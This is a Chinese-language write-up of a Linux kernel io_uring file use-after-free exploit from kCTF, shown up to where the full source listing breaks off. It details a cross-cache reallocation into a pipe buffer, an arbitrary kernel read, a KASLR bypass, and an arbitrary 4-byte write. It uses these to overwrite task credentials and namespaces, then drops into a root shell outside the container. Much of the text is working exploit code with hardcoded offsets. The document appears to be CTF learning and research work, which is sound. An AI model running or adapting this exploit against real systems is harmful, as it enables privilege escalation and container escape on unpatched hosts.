## 简介

自去年秋天以来，我一直在断断续续地进行一些 Linux 内核漏洞利用的开发/学习和漏洞研究。几个月前，我在假期中闲下来，坐下来挑战一下自己，针对 kCTF 中被利用的一个真实 bug 编写了我的第一个纯数据漏洞利用程序。io_ring 一直是该程序历史上的一个热门目标，所以我想在那里找一个已经被利用过的容易推理的 bug，作为漏洞利用开发创意的沃土。我选择利用的漏洞是一个结构文件 UAF，在这个结构文件 UAF 中，被释放的对象有可能持有一个打开的文件描述符。关于文件 UAF 漏洞利用的文章已经不少了，所以我决定，作为一项挑战，我的漏洞利用必须是纯数据的。自我挑战的参数完全是任意的，但我只是想尝试编写一个不依赖于劫持控制流的漏洞。在这一点上，我已经编写了不少针对真正的 kCTF 漏洞的 Linux 内核漏洞利用程序，大概有 5-6 个是作为练习，只是从漏洞开始，然后再从那里继续，但所有这些都以我使用 ROP 结束，所以这是我第一次尝试纯数据利用。我还没有见过结构文件 UAF 的纯数据漏洞，这让我很受鼓舞，因为这似乎值得 "研究"。


## Bug

这个[bug](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=fc7222c3a9f56271fba02aabbfbae999042f1679)非常简单（为什么我找不到这样的bug？），去年11月在[kCTF](https://docs.google.com/spreadsheets/d/e/2PACX-1vS1REdTA29OJftst8xN5B5x8iIUcxuK6bXdzF8G1UXCmRtoNsoQ9MbebdRdFnj6qZ0Yd7LwQfvYC2oF/pubhtml#)被人利用。我没有仔细查找，也没有在 kCTF discord 上询问，但我没能找到这个特定漏洞的 PoC。我找到了几篇关于利用类似漏洞的很好的文章，尤其是[pqlpql](https://twitter.com/pqlqpql) 和 [Awarau](https://twitter.com/Awarau1)写的这篇文章：[https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/).

我们不会过多地讨论这个漏洞具体是什么原因产生的，因为它对于我编写漏洞利用来说并不重要；但是，正如你可以从补丁中看出的那样，有一个调用在没有首先检查文件是否是 io_uring 中的固定文件的情况下，就调用了对文件的引用（减少）。有一种固定文件的概念是由 io_uring 本身管理的，在整个代码库中都有这样一种模式，即在放入请求文件之前对其进行检查，以确保它们不是固定文件。因此，我们可以从用户空间打开一个文件（refcount == 1），将该文件注册为固定文件（recount == 2），然后通过提交 IORING_OP_MSG_RING 请求调用错误代码路径，该请求完成后将错误地递减 refcount（refcount == 1），最后调用 io_uring_unregister_files，最终将 recount 递减为 0，并释放该文件，同时我们仍为其保留一个打开的文件描述符。这已经是最好的 bug 了。我需要找到其中一个。

我们可以对这类错误进行哪种变体分析？我不太确定，这似乎是一个很宽泛的类别。但细心的代码审查员可能会注意到，在代码库的其他地方，当有可能放入请求文件时，作者都会确保检查该文件是否已修复。而这个文件却忘了进行检查。我从中学到的主要经验是，在代码库中尝试找到多次执行某个操作的实例，并查找这些例程之间的差异。

## 站在巨人的肩膀上

需要强调的是，我在上面链接的 @pqlpql 和 @Awarau1 的博文对这一过程非常重要。在那篇博文中，他们详细介绍了如何利用一种名为 "交叉缓存 "的技术，迫使 Linux 内核将整个文件对象页面释放回页面分配器。文件结构体在内核中有自己的专用缓存，因此在 UAF 情况下，无论结构体文件的大小如何，典型的对象替换诡计在这种情况下都不是很有用。多亏了他们的博文，"交叉缓存 "的概念得到了越来越多的使用和讨论，至少根据我的经验，在 Twitter 上是这样。

我没有使用让文件对象的整个page被送回page allocator的伎俩，而是选择了以管道缓冲区的形式重新分配页面。更多信息请参阅 [@pqlpql](https://twitter.com/pqlqpql) 所写的 [博文](https://org.anize.rs/HITCON-2022/pwn/fourchain-kernel)（这是一篇非常棒的文章）。这是一种极其强大的技术，因为我们可以控制管道缓冲区的所有内容（通过写入），也可以读取 100%的页面内容（通过读取）。根据我的经验，它还非常可靠。我不想在这里说得太深入，因为这不是我的功劳，而是迄今为止提到的人的功劳。请阅读他们提供的材料。

## 任意读取

我开始寻找的第一件事是泄漏数据的方法，因为我一直固执地认为所有的 Linux 内核漏洞都遵循相同的模式：实现泄漏，从而击败 KASLR；在内存中找到一些有价值的对象；覆盖函数指针等等（事实证明并非如此）。在这一点上，我唯一可以确定的是，我有一个打开的文件描述符，所以让我们去看看 Linux 内核中的文件系统代码吧。首先映入我眼帘的是 fs/fcntl.c 中的 fcntl 系统调用。一般来说，此时我所做的就是查看 Linux 内核的系统调用表，看看哪些系统调用以 fd 作为参数。然后，访问内核代码库中处理该系统调用实现的部分，并用 ctrl-f 查找函数 copy_to_user。这似乎是找到将数据泄露回用户空间的一种相对合理的方法。

copy_too_user 函数是 Linux 内核与用户空间接口的关键部分。它用于将数据从内核自己的内存空间复制到用户进程的内存空间。该函数确保复制过程安全进行，维持用户态内存和内核内存之间的分隔。

现在，如果在 [源代码](https://elixir.bootlin.com/linux/v5.19/source/fs/fcntl.c) 中查找 copy_to_user，第二个结果就是这里的代码段：

```
static long fcntl_rw_hint(struct file *file, unsigned int cmd,
			  unsigned long arg)
{
	struct inode *inode = file_inode(file);
	u64 __user *argp = (u64 __user *)arg;
	enum rw_hint hint;
	u64 h;

	switch (cmd) {
	case F_GET_RW_HINT:
		h = inode->i_write_hint;
		if (copy_to_user(argp, &h, sizeof(*argp)))
			return -EFAULT;
		return 0;
	case F_SET_RW_HINT:
		if (copy_from_user(&h, argp, sizeof(h)))
			return -EFAULT;
		hint = (enum rw_hint) h;
		if (!rw_hint_valid(hint))
			return -EINVAL;

		inode_lock(inode);
		inode->i_write_hint = hint;
		inode_unlock(inode);
		return 0;
	default:
		return -EINVAL;
	}
}
```

可以看到，在 F_GET_RW_HINT 情况下，一个 u64（"h"）被拷贝回用户空间。这个值来自 inode->i_write_hint 的值。inode 本身是从 file_inode(file) 返回的。该函数的源代码如下：

```
static inline struct inode *file_inode(const struct file *f)
{
	return f->f_inode;
}
```

那好吧。如果我们控制了文件，那么我们也就控制了 inode。结构文件是这样的
```
struct file {
	union {
		struct llist_node	fu_llist;
		struct rcu_head 	fu_rcuhead;
	} f_u;
	struct path		f_path;
	struct inode		*f_inode;	/* cached value */
<SNIP>
```

由于我们使用管道缓冲区作为替换对象（实际上是整个页面），因此可以将 inode 设置为任意地址。让我们查看一下 inode 结构，看看能从 i_write_hint 成员中了解到什么。
```
struct inode {
	umode_t			i_mode;
	unsigned short		i_opflags;
	kuid_t			i_uid;
	kgid_t			i_gid;
	unsigned int		i_flags;

#ifdef CONFIG_FS_POSIX_ACL
	struct posix_acl	*i_acl;
	struct posix_acl	*i_default_acl;
#endif

	const struct inode_operations	*i_op;
	struct super_block	*i_sb;
	struct address_space	*i_mapping;

#ifdef CONFIG_SECURITY
	void			*i_security;
#endif

	/* Stat data, not accessed from path walking */
	unsigned long		i_ino;
	/*
	 * Filesystems may only read i_nlink directly.  They shall use the
	 * following functions for modification:
	 *
	 *    (set|clear|inc|drop)_nlink
	 *    inode_(inc|dec)_link_count
	 */
	union {
		const unsigned int i_nlink;
		unsigned int __i_nlink;
	};
	dev_t			i_rdev;
	loff_t			i_size;
	struct timespec64	i_atime;
	struct timespec64	i_mtime;
	struct timespec64	i_ctime;
	spinlock_t		i_lock;	/* i_blocks, i_bytes, maybe i_size */
	unsigned short          i_bytes;
	u8			i_blkbits;
	u8			i_write_hint;
<SNIP>
```

因此，i_write_hint 是一个 u8，也就是一个单字节。这非常适合我们的需要，inode 将成为我们读取字节返回用户态的地址（加上成员的偏移量）。

由于我们控制着文件的 100% 备份数据，因此我们也控制着 inode 成员的值。因此，如果我们通过管道缓冲区在内存中设置了一个假文件结构，并将 inode 成员设置为 0x1337，内核就会尝试将 0x1337 作为地址取消定义，然后读取 i_write_hint 成员偏移量处的字节。因此，这就导致了一次任意读取。

我们这么快就找到了一个任意读取的小工具，这确实让我很受鼓舞，但我们应该把读取的目标放在哪里呢？


## 寻找阅读目标

因此，我们可以读取任意地址的数据，但不知道要读取什么。我为此纠结了好一阵子，但后来想起来，cpu_entry_area 在每次启动时都不是随机的，它始终位于同一个地址。我是从上面那篇关于文件 UAF 的博文中知道这一点的，但也隐约从 [@ky1ebot](https://twitter.com/ky1ebot) 的推文中知道，比如 [这条](https://twitter.com/ky1ebot/status/1601231194062192640?s=20)。

cpu_entry_area 是内核中用于处理某些类型的中断和异常的每个 CPU 的特殊区域。内核中有一个[中断堆栈](https://docs.kernel.org/next/x86/kernel-stacks.html)的概念，可以在必须处理异常时使用。


使用 GDB 进行调试后，我注意到至少有一个内核文本指针始终显示在 cpu_entry_area 中，这是 error_entry 函数内部的一个地址，具体如下：

```
SYM_CODE_START_LOCAL(error_entry)
	UNWIND_HINT_FUNC

	PUSH_AND_CLEAR_REGS save_ret=1
	ENCODE_FRAME_POINTER 8

	testb	$3, CS+8(%rsp)
	jz	.Lerror_kernelspace

	/*
	 * We entered from user mode or we're pretending to have entered
	 * from user mode due to an IRET fault.
	 */
	swapgs
	FENCE_SWAPGS_USER_ENTRY
	/* We have user CR3.  Change to kernel CR3. */
	SWITCH_TO_KERNEL_CR3 scratch_reg=%rax
	IBRS_ENTER
	UNTRAIN_RET

	leaq	8(%rsp), %rdi			/* arg0 = pt_regs pointer */
.Lerror_entry_from_usermode_after_swapgs:

	/* Put us onto the real thread stack. */
	call	sync_regs
	RET
<SNIP>
```

error_entry 用来处理各种异常和中断的入口点，因此我认为函数内部的偏移可能会在 cpu_entry_area 中的中断堆栈中找到。这个地址就是函数中调用 sync_regs 部分的地址。我始终无法确认在执行调用时，系统上会发生哪些类型的常见异常/中断，从而将该地址推送到堆栈上，但如果我对这部分漏洞的理解有误，请告诉我。至少我认为这是有道理的，而且在我的测试过程中，该地址在 cpu_entry_area 中的出现非常普遍，从未缺席过。有了已知偏移量的内核文本地址，我们就可以通过任意读取来破解 KASLR。至此，我们已经完成了读取、读取目标和 KASLR。

同样，这部分也没花多少时间就弄明白了，因为当时我刚刚从上述博文中了解到 cpu_entry_area。

## Where are the Write Gadgets?


实际上，我花了好几天时间才找到一个满意的`Write Gadget`。找到这个`Gadget`的经历让我有点得意忘形，我以为这也会是一个类似的简单搜索。我采用了大致相同的方法，即查看以 fd 为参数的系统调用，然后跟踪这些调用，寻找对 copy_too_user 的调用，但我的运气并不好。在此期间，我与我才华横溢的朋友 [@Firzen14](https://twitter.com/Firzen14) 讨论了这个话题，他在这里提出了这个概念：[https://googleprojectzero.blogspot.com/2022/11/a-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html#h.yfq0poarwpr9](https://googleprojectzero.blogspot.com/2022/11/a-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html#h.yfq0poarwpr9).在 P0 的博文中，他们谈到了 signalfd 文件的 signalfd_ctx 如何存储在 `f.file->private_data` 字段中，以及 signalfd 系统调用如何允许攻击者对 ctx->sigmask 执行写操作。因此，在我们的情况下，由于我们控制了整个伪造文件的内容，所以在内存中伪造一个伪造的 signalfd_ctx 将非常容易，因为我们可以访问整个内存页面。


这种攻击方法之前就已经有了。但这确实让我看到了在结构文件的 private_data 字段中存储上下文和对象的概念。于是，我开始在内核代码库中寻找 private_data 的用法。正如你所看到的，该成员在很多地方都有使用：[https://elixir.bootlin.com/linux/latest/C/ident/private_data](https://elixir.bootlin.com/linux/latest/C/ident/private_data).

这给了我很大的鼓舞，因为在这么多不同的代码路径中使用这么多成员实例的情况下，我一定会找到某种方法来实现任意写入；然而，我还是费了好大的劲才找到一个合适的`gadget`。最后，我决定回头看看 io_uring 本身。

在查找使用 file->private_data 的实例时，我很快就在与 bug 相关的函数中找到了一个实例。在 io_msg_ring 中，你可以看到从 req->file->private data 派生了一个 io_ring_ctx 类型的 target_ctx。由于我们控制了假文件，因此可以控制 private_data 的内容（本例中是指向假 io_ring_ctx 的指针）。

在 io_fill_cqe_aux 中，我们实际上是通过 io_get_cqe 从我们可能伪造的 io_uring_ctx 中获取了一个 io_uring_cqe 结构。随即，我们看到多个 WRITE_ONCE 宏被用于向该对象写入数据。这看起来非常有希望。我起初打算使用这个写入函数作为我的小工具，但正如你稍后会看到的，写入序列及其发生的偏移并不适合我的开发计划。所以现在，我们将在相同的代码路径中找到第二个写入点。

在调用 io_fill_cqe_aux 之后，紧接着就是使用我们伪造的 io_uring_ctx 调用 io_commit_cqring：

```
static inline void io_commit_cqring(struct io_ring_ctx *ctx)
{
	/* order cqe stores with ring update */
	smp_store_release(&ctx->rings->cq.tail, ctx->cached_cq_tail);
}
```

这基本上是一个 memcpy，我们将 ctx->cached_cq_tail 的内容（100% 由用户控制）写入 &ctx->ring->cq.tail 的内容（100% 由用户控制）。在这种情况下，写入内容的大小为 4 字节。因此，我们实现了任意 4 字节的写入。从这里开始，就看你想写什么类型的利用程序了，所以我决定本着自我挑战的精神，写一个我从未写过的利用程序。

## 漏洞利用


现在，我们已经拥有了所有可能需要的工具，是时候开始制定开发计划了。在 kCTF 环境中，你是作为容器内的非特权用户运行的，你的目标是逃离容器并从主机文件系统中读取标志值。


老实说，在这方面我不知道该从何下手，幸好有一些很好的文章解释了这种情况。[来自 Cyberark 的这篇文章](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation) 对于理解内核中如何实现任务的容器化非常有帮助。我还从 Andy Nguyen 关于其 kCTF 漏洞利用的[博文](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html)中获得了一些非常有用的指点。非常感谢 Andy，他是为数不多的真正详细说明了逃逸容器步骤的人。


### Finding Init


此时，我的目标是找到内存中的 host Init task_struct，并找到几个重要成员的值：real_cred、cred 和 nsproxy。real_cred 用于跟踪最初负责创建进程的用户和组 ID，与 cred 不同，real_cred 保持不变，不会因 setuid 等因素而改变。最后，也是最重要的一点，因为我们被困在一个容器中，nsproxy 是一个指向结构体的指针，该结构体包含有关任务命名空间（如网络、挂载、IPC 等）的所有信息。所有这些成员都是指针，因此如果我们能通过任意读取找到它们的值，就能在 task_struct 中覆盖我们自己的凭据和命名空间。幸运的是，init 任务的地址是从内核基值出发的恒定偏移量，因此一旦我们读取了 error_entry 地址，就能破解 KASLR，然后利用任意读取能力复制这些值，因为它们位于已知地址（从 init 任务符号出发的偏移量）。

### Forging Objects


有了这些值，我们现在需要在内存中找到自己的 task_struct，以便用 init 的成员覆盖我们的成员。为此，我利用了 task_struct 中的系统任务链接列表这一事实。因此，在漏洞利用的早期，我用一个已知的名字产生了一个子进程，这个名字就在 task_struct 的通讯字段中，所以当我遍历系统中的链接任务列表时，我只需检查每个任务的通讯字段，就能找到我容易识别的子进程。你可以在这段代码中看到我是如何做的：

```
void traverse_tasks(void)
{    
    // Process name buf
    char current_comm[16] = { 0 };

    // Get the next task after init
    uint64_t current_next = read_8_at(g_init_task + TASKS_NEXT_OFF);
    uint64_t current = current_next - TASKS_NEXT_OFF;

    if (!task_valid(current))
    { 
        err("Invalid task after init: 0x%lx", current);    
    }

    // Read the comm
    read_comm_at(current + COMM_OFF, current_comm);
    //printf("    - Address: 0x%lx, Name: '%s'\n", current, current_comm);

    // While we don't have NULL, traverse the list
    while (task_valid(current))
    {
        current_next = read_8_at(current_next);
        current = current_next - TASKS_NEXT_OFF;

        if (current == g_init_task) { break; }

        // Read the comm
        read_comm_at(current + COMM_OFF, current_comm);
        //printf("    - Address: 0x%lx, Name: '%s'\n", current, current_comm);

        // If we find the target comm, save it
        if (!strcmp(current_comm, TARGET_TASK))
        {
            g_target_task = current;
        }

        // If we find our target comm, save it
        if (!strcmp(current_comm, OUR_TASK))
        {
            g_our_task = current;
        }
    }
}
```

您还可以看到，我们不仅找到了目标任务，还在内存中找到了自己的任务。这对我选择利用这个漏洞的方法很重要，因为我们需要在内存中伪造一些对象，比如 io_uring_ctx。通常情况下，我们需要在内核堆中伪造一些对象，然后通过泄漏发现它们的地址。在我的例子中，我有一个 4096 字节内存的管道缓冲区需要利用。唯一的问题是，我不知道它在哪里。但我知道它有一个打开的文件描述符，而且我知道每个任务的文件成员中都有一个[文件描述符表](https://elixir.bootlin.com/linux/v5.19/source/include/linux/fdtable.h#L49)。在打印了一些偏移量之后，我就能遍历我自己任务的文件描述符表，并得知我的管道缓冲区的地址。这是因为管道缓冲区的页面显然是页面对齐的，所以我可以直接将从文件描述符表中读取的地址作为 UAF 文件的地址进行页面对齐。因此，我现在可以准确知道内存中管道缓冲区的位置，也知道 UAF 结构文件位于该页面的哪个偏移位置。我有一个小辅助函数，用于将 "划痕空间 "区域地址设置为全局地址，然后使用该内存设置我们的假 io_uring_ctx。你可以在这里看到这些函数，首先是找到我们的管道缓冲区地址：

```
void find_pipe_buf_addr(void)
{
    // Get the base of the files array
    uint64_t files_ptr = read_8_at(g_file_array);
    
    // Adjust the files_ptr to point to our fd in the array
    files_ptr += (sizeof(uint64_t) * g_uaf_fd);

    // Get the address of our UAF file struct
    uint64_t curr_file = read_8_at(files_ptr);

    // Calculate the offset
    g_off = curr_file & 0xFFF;

    // Set the globals
    g_file_addr = curr_file;
    g_pipe_buf = g_file_addr - g_off;

    return;
}
```

然后确定我们将伪造 io_uring_ctx 的位置：

```
// Here, all we're doing is determing what side of the page the UAF file is on,
// if its on the front half of the page, the back half is our scratch space
// and vice versa
void set_scratch_space(void)
{
    g_scratch = g_pipe_buf;
    if (g_off < 0x500) { g_scratch += 0x500; }
}
```


现在我们还需要进行一次读取，这实际上只是为了让漏洞利用变得更容易。为了避免在触发写入时进行大量调试，我需要确保我伪造的 io_uring_ctx 包含尽可能多的有效字段。如果一开始就使用一个完全为空的对象，那么你就必须对每次 NULL 解除内核panic进行故障排除，并确定哪里出了问题，以及该成员应该具有什么样的值。相反，我选择了复制一个真实 io_uring_ctx 的合法实例，将其内容读取并复制到全局缓冲区。有了良好的基础，我们就可以对伪造对象进行正确设置，以执行任意写入操作，你可以看到我在这里使用了复制并更新了必要的字段：

```
void write_setup_ctx(char *buf, uint32_t what, uint64_t where)
{
    // Copy our copied real ring fd 
    memcpy(&buf[g_off], g_ring_copy, 256);

    // Set f->f_count to 1 
    uint64_t *count = (uint64_t *)&buf[g_off + 0x38];
    *count = 1;

    // Set f->private_data to our scratch space
    uint64_t *private_data = (uint64_t *)&buf[g_off + 0xc8];
    *private_data = g_scratch;

    // Set ctx->cqe_cached
    size_t cqe_cached = g_scratch + 0x240;
    cqe_cached &= 0xFFF;
    uint64_t *cached_ptr = (uint64_t *)&buf[cqe_cached];
    *cached_ptr = NULL_MEM;

    // Set ctx->cqe_sentinel
    size_t cqe_sentinel = g_scratch + 0x248;
    cqe_sentinel &= 0xFFF;
    uint64_t *sentinel_ptr = (uint64_t *)&buf[cqe_sentinel];

    // We need ctx->cqe_cached < ctx->cqe_sentinel
    *sentinel_ptr = NULL_MEM + 1;

    // Set ctx->rings so that ctx->rings->cq.tail is written to. That is at 
    // offset 0xc0 from cq base address
    size_t rings = g_scratch + 0x10;
    rings &= 0xFFF;
    uint64_t *rings_ptr = (uint64_t *)&buf[rings];
    *rings_ptr = where - 0xc0;

    // Set ctx->cached_cq_tail which is our what
    size_t cq_tail = g_scratch + 0x250;
    cq_tail &= 0xFFF;
    uint32_t *cq_tail_ptr = (uint32_t *)&buf[cq_tail];
    *cq_tail_ptr = what;

    // Set ctx->cq_wait the list head to itself (so that it's "empty")
    size_t real_cq_wait = g_scratch + 0x268;
    size_t cq_wait = (real_cq_wait & 0xFFF);
    uint64_t *cq_wait_ptr = (uint64_t *)&buf[cq_wait];
    *cq_wait_ptr = real_cq_wait;
}
```

### Performing Our Writes

现在，是时候进行写入操作了。还记得我们打算在 io_fill_cqe_aux 中使用的三个顺序写入吗？原因是，这三次写操作如下：

```
cqe = io_get_cqe(ctx);
	if (likely(cqe)) {
		WRITE_ONCE(cqe->user_data, user_data);
		WRITE_ONCE(cqe->res, res);
		WRITE_ONCE(cqe->flags, cflags);
```


在覆盖目标子 task_struct 中的目标 nsproxy 成员之前，它们工作得非常顺利。其中一次写入不可避免地覆盖了 nsproxy 旁边的成员：signal 和 sighand。这给我带来了很大的麻烦，因为当中断发生时，这些成员（指针）会被取消引用，并导致内核慌乱，因为它们是无效值。因此，我选择在 io_commit_cqring 中只写入 4 字节。4 字节写入也会带来一些问题，因为在某些情况下，需要对当前值进行检查，而这基本上相当于撕裂式的 8 字节写入，在这些检查过程中，我们会让当前值处于无效状态。这就是我不得不使用子进程的原因。感谢 @pqlpql 告诉我这个问题。

现在，我们只需使用同样的步骤覆盖 real_cred、cred 和 nsproxy 这三个成员，我们的子节点就能拥有与 init 相同的权限和能力，包括在主机根文件系统中的可见性。这样就完美了，但我仍然无法获得标志！


这时我开始恐慌，担心自己做错了什么。这个漏洞利用起来需要经过很多的检查：例如，我重读了每一个被覆盖的值，以确保它是正确的，所以我确信我的写入操作是正确的。我感觉我的命名空间在子进程中还没有生效，好像被缓存在了某个地方。但后来我想起在 Andy Nguyen 的博文中，他使用 root 权限通过调用 setns 来明确设置命名空间值。一旦我添加了这一步，孩子就能看到根文件系统并找到标志。与其让我的孩子使用与 init 相同的命名空间，不如让它使用与自己相同的命名空间。我还没来得及确定 setns 是如何实现的，但也许不需要明确调用 setns，只用我们的读写工具就能实现：

```
// Our child waits to be given super powers and then drops into shell
void child_exec(void)
{
    // Change our taskname 
    if (prctl(PR_SET_NAME, TARGET_TASK, NULL, NULL, NULL) != 0)
    {
        err("`prctl()` failed");
    }

    while (1)
    {
        if (*(int *)g_shmem == 0x1337)
        {
            sleep(3);
            info("Child dropping into root shell...");
            if (setns(open("/proc/self/ns/mnt", O_RDONLY), 0) == -1) { err("`setns()`"); }
            if (setns(open("/proc/self/ns/pid", O_RDONLY), 0) == -1) { err("`setns()`"); }
            if (setns(open("/proc/self/ns/net", O_RDONLY), 0) == -1) { err("`setns()`"); }
            char *args[] = {"/bin/sh", NULL, NULL};
            execve(args[0], args, NULL);
        }

        else { sleep(2); }
    }
}
```

最后，我终于可以进入 root shell 并捕获标志，逃离容器。当我尝试在谷歌基础架构上使用我的漏洞时，一个巨大的障碍是他们的内核编译时支持 SELinux，而我的测试环境不支持。但幸运的是，与大多数其他 fcntl syscall 标志不同，我们使用的任意读取实际上并没有被 SELinux 以任何方式挂钩。在这一点上，请记住，我们还不知道足够的信息来伪造内存中的任何对象，所以如果这种读取方法被 SELinux 毁了，就没有办法利用了。

## 结论


这对我来说非常有趣，也让我学到了很多东西。我认为这类学习挑战很棒，而且风险较低。我非常感谢前面提到的每个人，还有 [@chompie1337](https://twitter.com/chompie1337)，他在我覆盖了我的密码后，听着我因为无法读取标志而抓狂。漏洞利用的全文贴在下面，如果你在理解上有任何问题，请告诉我，谢谢。

```
// Compile
// gcc sploit.c -o sploit -l:liburing.a -static -Wall

#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <stdarg.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/msg.h>
#include <sys/timerfd.h>
#include <sys/mman.h>
#include <sys/prctl.h>

#include "liburing.h"

// /sys/kernel/slab/filp/objs_per_slab
#define OBJS_PER_SLAB 16UL
// /sys/kernel/slab/filp/cpu_partial
#define CPU_PARTIAL 52UL
// Multiplier for cross-cache arithmetic
#define OVERFLOW_FACTOR 2UL
// Largest number of objects we could allocate per Cross-cache step
#define CROSS_CACHE_MAX 8192UL
// Fixed mapping in cpu_entry_area whose contents is NULL
#define NULL_MEM 0xfffffe0000002000UL
// Reading side of pipe
#define PIPE_READ 0
// Writing side of pipe
#define PIPE_WRITE 1
// error_entry inside cpu_entry_area pointer
#define ERROR_ENTRY_ADDR 0xfffffe0000002f48UL
// Offset from `error_entry` pointer to kernel base
#define EE_OFF 0xe0124dUL
// Kernel text signature
#define KERNEL_SIGNATURE 0x4801803f51258d48UL
// Offset from kernel base to init_task
#define INIT_OFF 0x18149c0UL
// Offset from task to task->comm
#define COMM_OFF 0x738UL
// Offset from task to task->real_cred
#define REAL_CRED_OFF 0x720UL
// Offset from task to task->cred
#define CRED_OFF 0x728UL
// Offset from task to task->nsproxy
#define NSPROXY_OFF 0x780UL
// Offset from task to task->files
#define FILES_OFF 0x770UL
// Offset from task->files to &task->files->fdt
#define FDT_OFF 0x20UL
// Offset from &task->files->fdt to &task->files->fdt->fd
#define FD_ARRAY_OFF 0x8UL
// Offset from task to task->tasks.next
#define TASKS_NEXT_OFF 0x458UL
// Process name to give root creds to 
#define TARGET_TASK "blegh2"
// Our process name
#define OUR_TASK "blegh1"
// Offset from kernel base to io_uring_fops
#define FOPS_OFF 0x1220200UL

// Shared memory with child
void *g_shmem;

// Child pid
pid_t g_child = -1;

// io_uring instance to use
struct io_uring g_ring = { 0 };

// UAF file handle
int g_uaf_fd = -1;

// Track pipes
struct fd_pair {
    int fd[2];
};
struct fd_pair g_pipe = { 0 };

// The offset on the page where our `file` is
size_t g_off = 0;

// Our fake file that is a copy of a legit io_uring fd
unsigned char g_ring_copy[256] = { 0 };

// Keep track of files added in Cross-cache steps
int g_cc1_fds[CROSS_CACHE_MAX] = { 0 };
size_t g_cc1_num = 0;
int g_cc2_fds[CROSS_CACHE_MAX] = { 0 };
size_t g_cc2_num = 0;
int g_cc3_fds[CROSS_CACHE_MAX] = { 0 };
size_t g_cc3_num = 0;

// Gadgets and offsets
uint64_t g_kern_base = 0;
uint64_t g_init_task = 0;
uint64_t g_target_task = 0;
uint64_t g_our_task = 0;
uint64_t g_cred_what = 0;
uint64_t g_nsproxy_what = 0;
uint64_t g_cred_where = 0;
uint64_t g_real_cred_where = 0;
uint64_t g_nsproxy_where = 0;
uint64_t g_files = 0;
uint64_t g_fdt = 0;
uint64_t g_file_array = 0;
uint64_t g_file_addr = 0;
uint64_t g_pipe_buf = 0;
uint64_t g_scratch = 0;
uint64_t g_fops = 0;

void err(const char* format, ...)
{
    if (!format) {
        exit(EXIT_FAILURE);
    }

    fprintf(stderr, "%s", "[!] ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, ": %s\n", strerror(errno));

    sleep(5);
    exit(EXIT_FAILURE);
}

void info(const char* format, ...)
{
    if (!format) {
        return;
    }
    
    fprintf(stderr, "%s", "[*] ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "%s", "\n");
}

// Get FD for test file
int get_test_fd(int victim)
{
    // These are just different for kernel debugging purposes
    char *file = NULL;
    if (victim) { file = "/etc//passwd"; }
    else { file = "/etc/passwd"; }

    int fd = open(file, O_RDONLY);
    if (fd < 0)
    {
        err("`open()` failed, file: %s", file);
    }

    return fd;
}

// Set-up the file that we're going to use as our victim object
void alloc_victim_filp(void)
{
    // Open file to register
    g_uaf_fd = get_test_fd(1);
    info("Victim fd: %d", g_uaf_fd);

    // Register the file
    int ret = io_uring_register_files(&g_ring, &g_uaf_fd, 1);
    if (ret)
    {
        err("`io_uring_register_files()` failed");
    }

    // Get hold of the sqe
    struct io_uring_sqe *sqe = NULL;
    sqe = io_uring_get_sqe(&g_ring);
    if (!sqe)
    {
        err("`io_uring_get_sqe()` failed");
    }

    // Init sqe vals
    sqe->opcode = IORING_OP_MSG_RING;
    sqe->fd = 0;
    sqe->flags |= IOSQE_FIXED_FILE;

    ret = io_uring_submit(&g_ring);
    if (ret < 0)
    {
        err("`io_uring_submit()` failed");
    }

    struct io_uring_cqe *cqe;
    ret = io_uring_wait_cqe(&g_ring, &cqe);
}

// Set CPU affinity for calling process/thread
void pin_cpu(long cpu_id)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu_id, &mask);
    if (sched_setaffinity(0, sizeof(mask), &mask) == -1)
    {
        err("`sched_setaffinity()` failed: %s", strerror(errno));
    }

    return;
}

// Increase the number of FDs we can have open
void increase_fds(void)
{
    struct rlimit old_lim, lim;
	
	if (getrlimit(RLIMIT_NOFILE, &old_lim) != 0)
    {
        err("`getrlimit()` failed: %s", strerror(errno));
    }
		
	lim.rlim_cur = old_lim.rlim_max;
	lim.rlim_max = old_lim.rlim_max;

	if (setrlimit(RLIMIT_NOFILE, &lim) != 0)
    {
		err("`setrlimit()` failed: %s", strerror(errno));
    }

    info("Increased fd limit from %d to %d", old_lim.rlim_cur, lim.rlim_cur);

    return;
}

void create_pipe(void)
{
    if (pipe(g_pipe.fd) == -1)
    {
        err("`pipe()` failed");
    }
}

void release_pipe(void)
{
    close(g_pipe.fd[PIPE_WRITE]);
    close(g_pipe.fd[PIPE_READ]);
}

// Our child waits to be given super powers and then drops into shell
void child_exec(void)
{
    // Change our taskname 
    if (prctl(PR_SET_NAME, TARGET_TASK, NULL, NULL, NULL) != 0)
    {
        err("`prctl()` failed");
    }

    while (1)
    {
        if (*(int *)g_shmem == 0x1337)
        {
            sleep(3);
            info("Child dropping into root shell...");
            if (setns(open("/proc/self/ns/mnt", O_RDONLY), 0) == -1) { err("`setns()`"); }
            if (setns(open("/proc/self/ns/pid", O_RDONLY), 0) == -1) { err("`setns()`"); }
            if (setns(open("/proc/self/ns/net", O_RDONLY), 0) == -1) { err("`setns()`"); }
            char *args[] = {"/bin/sh", NULL, NULL};
            execve(args[0], args, NULL);
        }

        else { sleep(2); }
    }
}

// Set-up environment for exploit
void setup_env(void)
{
    // Make sure a page is a page and we're not on some bullshit machine
    long page_sz = sysconf(_SC_PAGESIZE);
    if (page_sz != 4096L)
    {
        err("Page size was: %ld", page_sz);
    }

    // Pin to CPU 0
    pin_cpu(0);
    info("Pinned process to core-0");

    // Increase FD limit
    increase_fds();

    // Create shared mem
    g_shmem = mmap(
        (void *)0x1337000,
        page_sz,
        PROT_READ | PROT_WRITE,
        MAP_ANONYMOUS | MAP_FIXED | MAP_SHARED,
        -1,
        0
    );
    if (g_shmem == MAP_FAILED) { err("`mmap()` failed"); }
